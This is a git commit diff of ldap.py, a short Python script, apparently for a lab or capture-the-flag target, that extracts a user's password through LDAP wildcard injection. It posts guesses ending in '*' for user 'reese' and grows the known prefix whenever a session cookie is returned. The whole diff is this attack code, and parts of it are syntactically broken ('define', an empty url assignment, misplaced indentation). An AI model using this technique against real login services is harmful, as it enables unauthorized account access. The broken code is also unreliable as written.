5f6b5aa99d7daae3bcf3ca20b3d9921d06d17290
Elim Garak <203994+cardassian-tailor@users.noreply.github.com>
2020-12-16 22:42:00 -0500

    Update ldap.py

--- ldap.py
+++ ldap.py
@@ -1,21 +1,34 @@
-"""
-Quick script to brute force ldap for password discovery 
-"""
 import requests 
 import string
-letters = list(string.ascii_lowercase)
-letters.extend([i.upper() for i in letters])
-
+# letters = list(string.ascii_lowercase)
+# letters.extend([i.upper() for i in letters])
+# letters = string.printable   THis included everything but * was throwing off my wildcard ldap 
+letters = string.printable + string.digits + "!@#$%^&()_-+{}[]~`|\/?><.,:'="
 url =   # 167.91.91.91:30811
 itteration = ""
 
 
 define bruter():
-  for letter in letters:
-  itteration = ""
-  itteration = letter + "*"
-  parms = {'username:reese', 'password':itteration}
-  x = requests.post(url, data = parms)
-  print(x.url)
-  print(x.text)
+truthtable = "" 
+should_retry = True 
+while should_retry: 
+    print("while restrat") 
+    should_retry = False 
+    for letter in letters: 
+        itteration = truthtable 
+        print(f"itteration is {itteration}") 
+        itteration += letter + "*" 
+        parms = {'username':'reese','password':itteration} 
+        x = requests.Session() 
+        x.post(url, data = parms) 
+        print(parms) 
+        print(itteration) 
+        print(x.cookies.items()) 
+        if x.cookies.get('mysession'): 
+            print(' YESYESYESYESYESYESYESYSE'*2) 
+            truthtable += letter 
+            print('The truthtable is: ', truthtable) 
+            should_retry = True 
+            break  
+bruter()
   
